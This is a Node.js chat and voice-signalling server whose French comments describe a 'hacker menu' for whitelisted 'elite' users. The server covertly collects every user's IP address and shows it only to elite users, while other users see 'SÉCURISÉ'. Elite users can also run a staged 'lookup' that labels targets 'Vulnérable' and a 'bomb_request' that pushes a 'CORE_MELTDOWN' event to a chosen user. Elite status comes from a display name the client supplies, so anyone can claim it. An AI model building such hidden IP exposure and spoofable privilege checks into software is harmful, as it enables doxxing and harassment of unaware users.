const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

// --- CONFIGURATION ÉLITE ---
const WHITELIST = ["TonPseudo", "Admin2"]; // Seuls ces pseudos ont accès au menu Hacker
const users = {}; 

io.on('connection', (socket) => {
    const ip = (socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress || "0.0.0.0").split(',')[0].trim();

    socket.on('init_user', (data) => {
        const isElite = WHITELIST.includes(data.name);
        users[socket.id] = { ...data, ip, sid: socket.id, elite: isElite };
        console.log(`[NEBULA] ${data.name} (${isElite ? 'ELITE' : 'USER'}) connecté.`);
        sync();
    });

    function sync() {
        Object.keys(users).forEach(sid => {
            const requester = users[sid];
            const userList = Object.values(users).map(u => ({
                name: u.name, pp: u.pp, sid: u.sid,
                ip: requester.elite ? u.ip : "SÉCURISÉ",
                elite: u.elite
            }));
            io.to(sid).emit('update_users', userList);
        });
    }

    // --- FONCTIONS HACKER (WHITELIST ONLY) ---
    socket.on('lookup_request', (targetSid) => {
        if (!users[socket.id]?.elite) return;
        const target = users[targetSid];
        if (target) {
            // Simulation de Lookup profond
            const lookupData = {
                ip: target.ip,
                city: "Localisation en cours...",
                provider: "ISP Detecté",
                os: "Système distant identifié",
                status: "Vulnérable"
            };
            socket.emit('lookup_result', lookupData);
        }
    });

    socket.on('bomb_request', (targetSid) => {
        if (!users[socket.id]?.elite) return;
        io.to(targetSid).emit('CORE_MELTDOWN');
    });

    // --- SIGNALING UNIVERSEL (VOICE) ---
    socket.on('call_request', (d) => io.to(d.to).emit('incoming_call', { signal: d.signal, from: socket.id, name: users[socket.id].name, pp: users[socket.id].pp }));
    socket.on('call_accept', (d) => io.to(d.to).emit('call_finalized', d.signal));
    socket.on('ice_candidate', (d) => io.to(d.to).emit('ice_candidate', d.candidate));

    socket.on('chat_msg', (d) => io.emit('chat_msg', d));
    socket.on('disconnect', () => { delete users[socket.id]; sync(); });
});

http.listen(3000, () => console.log("NEBULA_PREMIUM_V28_ACTIVE"));
